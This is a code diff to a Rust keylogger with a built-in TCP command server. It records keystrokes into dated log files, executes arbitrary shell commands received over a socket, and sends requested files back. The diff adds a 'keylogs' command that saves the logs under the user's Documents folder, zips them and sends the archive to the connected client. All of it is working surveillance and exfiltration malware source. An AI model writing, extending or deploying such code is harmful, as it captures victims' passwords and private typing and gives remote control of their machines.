@@ -1,6 +1,7 @@
 use chrono::Local;
 use rdev::{listen, EventType};
 use std::env;
+use std::fs;
 use std::fs::File;
 use std::fs::OpenOptions;
 use std::path::Path;
@@ -12,6 +13,7 @@ use std::{
     net::{TcpListener, TcpStream},
     process::{Command, Stdio},
 };
+use zip::{write::SimpleFileOptions, ZipWriter};
 
 fn main() -> std::io::Result<()> {
     let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
@@ -106,10 +108,20 @@ fn process_stream(mut stream: TcpStream) -> io::Result<()> {
                 .nth(1)
                 .expect("No file name provided");
             send_file(&mut stream, filename)?;
+        } else if message.starts_with("keylogs") {
+            let mut folder_path =
+                dirs::document_dir().expect("Could not find user's Documents directory");
+            folder_path.push("Logs");
+
+            if let Some(folder_str) = folder_path.to_str() {
+                send_folder(&mut stream, folder_str)?;
+            } else {
+                eprintln!("Error: Could not convert folder path to string.");
+            }
         } else {
             let response = match execute_command(&message) {
                 Ok(result) => result,
-                Err(e) => {                    
+                Err(e) => {
                     format!("Error executing command: {}\n", e)
                 }
             };
@@ -224,13 +236,71 @@ fn send_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
 fn append_to_log(data: &str) -> io::Result<()> {
     let now = Local::now();
     let timestamp = now.format("%Y-%m-%d %H:%M:%S");
+
+    let mut file_path = dirs::document_dir().expect("Could not find user's documents directory");
+    file_path.push("Logs");
+
+    // Ensure the directory exists, otherwise create it
+    std::fs::create_dir_all(&file_path)?;
+
     let file_name = format!("keylogger_{}.log", now.format("%Y-%m-%d"));
+    file_path.push(file_name);
 
     let mut file = OpenOptions::new()
         .append(true)
         .create(true)
-        .open(file_name)?;
+        .open(file_path)?;
 
     file.write_all(format!("{}:\n{}\n", timestamp, data).as_bytes())?;
+    Ok(())
+}
+
+// Function to send a folder as a zip file
+fn send_folder(stream: &mut TcpStream, folder_name: &str) -> io::Result<()> {
+    let folder_path = Path::new(folder_name);
+
+    if folder_path.is_dir() {
+        // Create a zip file in-memory
+        let zip_file_name = format!("{}.zip", folder_name);
+        let zip_file = File::create(&zip_file_name)?;
+        let mut zip = ZipWriter::new(zip_file);
+
+        // Recursively add files to the zip
+        zip_dir(&folder_path, &folder_path, &mut zip)?;
+
+        // Finish writing to zip
+        zip.finish()?;
+
+        // Send the zip file using the existing send_file function
+        send_file(stream, &zip_file_name)?;
+
+        // Optionally, delete the zip file after sending it
+        std::fs::remove_file(zip_file_name)?;
+    } else {
+        println!("Error: {} is not a directory", folder_name);
+    }
+    Ok(())
+}
+
+// Recursively add a directory and its contents to the zip
+fn zip_dir(dir: &Path, base_dir: &Path, zip: &mut ZipWriter<File>) -> io::Result<()> {
+    let dir_entries = fs::read_dir(dir)?;
+
+    for entry in dir_entries {
+        let entry = entry?;
+        let path = entry.path();
+
+        if path.is_dir() {
+            // Recursively zip subdirectories
+            zip_dir(&path, base_dir, zip)?;
+        } else {
+            let name = path.strip_prefix(base_dir).unwrap();
+            let mut file = File::open(&path)?;
+
+            zip.start_file(name.to_string_lossy(), SimpleFileOptions::default())?;
+            io::copy(&mut file, zip)?;
+        }
+    }
+
     Ok(())
 }
